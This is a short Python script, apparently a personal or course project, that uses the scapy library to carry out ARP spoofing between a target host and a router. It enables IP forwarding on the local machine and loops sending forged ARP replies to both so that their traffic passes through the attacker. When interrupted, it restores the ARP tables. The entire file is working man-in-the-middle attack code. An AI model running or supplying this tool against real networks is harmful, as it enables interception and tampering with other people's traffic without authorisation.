#!/usr/bin/env python3

from time import sleep
import scapy.all as scapy
import subprocess
import argparse

from scapy.packet import Packet

# Hard coded values to replace via optparse
# target = {"name": "target", "ip": "10.211.55.6", "mac": "00:1c:42:aa:7c:10"}
# router = {"name": "router", "ip": "10.211.55.1", "mac": "00:1c:42:00:00:18"}
# verbose = False

# TODO implement verbose functionality
# TODO seperate out fetching mac from spoof()
# TODO add support for hostnames/FQDNs instead of IPs

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-v", "--verbose", help="Increase output verbosity", action="store_true")
    parser.add_argument("-r", "--router", type=str, help="Router IP")
    parser.add_argument("-t", "--target", type=str, help="Target IP")
    args = parser.parse_args()
    if args.verbose:
        print("[+] verbosity turned on")
        print(args.target, args.router)
    if not args.router:
        parser.error("[-] Please specify a router IP or use --help for more info.")
    if not args.target:
        parser.error("[-] Please specify a target IP or use --help for more info.")
    return args

def get_mac(host):
    ''' TODO '''
    arp_request = scapy.ARP(pdst=host)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    targets_found = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    target_mac_address = targets_found[0][1].hwsrc
    if args.verbose:
        print("[+] Target MAC: " + target_mac_address)
    return(target_mac_address)

def spoof(target, spoof):
    ''' TODO '''
    target_mac = get_mac(target) # TODO - this is inefficient to keep fetching the mac here. Prefetch outside the spoof function in a dict target.ip, target.mac 
    packet = scapy.ARP(op=2, pdst=target, hwdst=target_mac, psrc=spoof)
    if args.verbose:
        print(packet.show())
        print(packet.summary())
    scapy.send(packet, verbose=False)

def restore_arp(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    if args.verbose:
        print(packet.show())
        print(packet.summary())
    scapy.send(packet, verbose=False)

args = get_arguments()
# print(args)
# print(args.target, args.router)

subprocess.call(["bash", "-c", "echo 1 > /proc/sys/net/ipv4/ip_forward"]) # Setup routing/forwarding locally

sent_packet_count = 0
try:
    while True:
        spoof(args.target, args.router)
        sent_packet_count = sent_packet_count + 1
        print("\r[+] arp_spoof packet: " + str(sent_packet_count) + " to " + args.target + " (target) ", end="")
        spoof(args.router, args.target)
        sent_packet_count = sent_packet_count + 1
        print(" packet: " + str(sent_packet_count) + " to " + args.router + " (router)", end="")
        sleep(1)
except KeyboardInterrupt:
    print("\n[+] Detected CTRL +C .... Quitting.")
    restore_arp(args.target, args.router)